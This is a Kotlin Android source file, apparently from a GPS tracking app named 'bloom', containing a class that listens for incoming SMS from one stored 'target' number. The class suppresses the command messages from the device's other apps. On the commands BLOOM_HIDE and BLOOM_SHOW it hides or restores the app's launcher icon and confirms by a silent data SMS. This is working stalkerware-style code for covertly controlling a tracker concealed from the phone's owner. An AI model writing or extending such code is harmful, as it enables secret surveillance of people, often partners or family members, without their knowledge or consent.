package com.bloom.gps

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import androidx.preference.PreferenceManager

class SecretCommandReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        abortBroadcast()
        
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        val texte = messages.joinToString("") { it.messageBody }.trim()
        val numeroExpediteur = messages.firstOrNull()?.originatingAddress ?: ""

        val prefs = PreferenceManager.getDefaultSharedPreferences(context)
        val numeroAutorise = prefs.getString("NUMERO_CIBLE", "")

        if (numeroExpediteur != numeroAutorise) return

        when {
            texte == "BLOOM_HIDE" -> {
                cacherApplication(context)
                reponseSilencieuse(context, numeroExpediteur, "BLOOM:OK_CACHE")
            }
            texte == "BLOOM_SHOW" -> {
                faireReapparaitreApplication(context)
                reponseSilencieuse(context, numeroExpediteur, "BLOOM:OK_MONTRE")
            }
        }
    }

    private fun cacherApplication(context: Context) {
        val pm = context.packageManager
        pm.setComponentEnabledSetting(
            ComponentName(context, "com.bloom.gps.MainActivity"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d("BLOOM-DATA", "🕵️ Application cachée")
    }

    private fun faireReapparaitreApplication(context: Context) {
        val pm = context.packageManager
        pm.setComponentEnabledSetting(
            ComponentName(context, "com.bloom.gps.MainActivity"),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d("BLOOM-DATA", "🔓 Application réapparaît")
    }

    private fun reponseSilencieuse(context: Context, numero: String, message: String) {
        try {
            SmsManager.getDefault().sendDataMessage(
                numero, null, 10002.toShort(),
                message.toByteArray(Charsets.UTF_8),
                null, null
            )
        } catch (e: Exception) {
            Log.e("BLOOM-DATA", "Erreur: ${e.message}")
        }
    }
}
